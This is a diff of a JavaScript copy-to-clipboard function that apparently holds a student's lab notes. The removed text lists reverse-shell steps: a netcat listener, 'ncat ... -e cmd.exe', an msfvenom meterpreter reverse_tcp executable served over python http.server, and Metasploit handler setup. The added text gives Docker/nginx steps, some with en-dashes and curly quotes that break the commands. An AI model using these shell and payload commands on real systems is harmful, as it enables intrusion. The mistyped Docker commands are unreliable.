@@ -280,29 +280,38 @@ http.request.method=="POST"`;
     }
     function copyMultilineText5() {
       // Your variable containing multiline text data
-      var yourMultilineVariable = `ufw disable
-nc -lvp 555
-ifconfig 
-ncat linux ip 555 -e cmd.exe (windows)
-cd test
-new panel
-mkdir test
+      var yourMultilineVariable = `P4
+1)docker pull nginx
+2)docker run -it --name=webApp -d -p 80:80 nginx
+Open port 80
+3)
+docker exec -it webApp bash
+cd /usr/share/nginx/html.
+echo “Hello Welcome to updated nginx Page.”> index.html
+exit
 
-msfconsole
-msfvenom
-msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=5555 -f exe> /home/kali/Desktop/test/reverse_tcp.exe
-use exploit
+4)docker ps 
+5)docker stop webApp
+6)docker run -it –-name=WebAppS -d -p 80:80 nginx
+Open port again
 
-new panel
-sudo -i
-python3 -m http.server    
-1) use exploit/multi/handler
-2)set payload windows/meterpreter/reverse_tcp
-3)set lhost (kali ip)
-4)set lport 5555
-5)exploit
-ip:5555
-ip:8000`;
+7)docker volume create MyVolume
+8)docker volume ls
+9)docker volume inspect MyVolume
+10)docker stop WebAppS
+
+11)docker run -d –-name=WebApS --mount source=MyVolume,destination=/usr/share/nginx/html –p 80:80 nginx
+
+12)ls /
+cd /var/lib/docker
+ls
+cd volumes
+ls
+cd MyVolume
+ls
+cd _data
+
+13)echo "My Volume " >index.html`;
 
       // Assign the variable's value to the text variable
       var text = yourMultilineVariable;
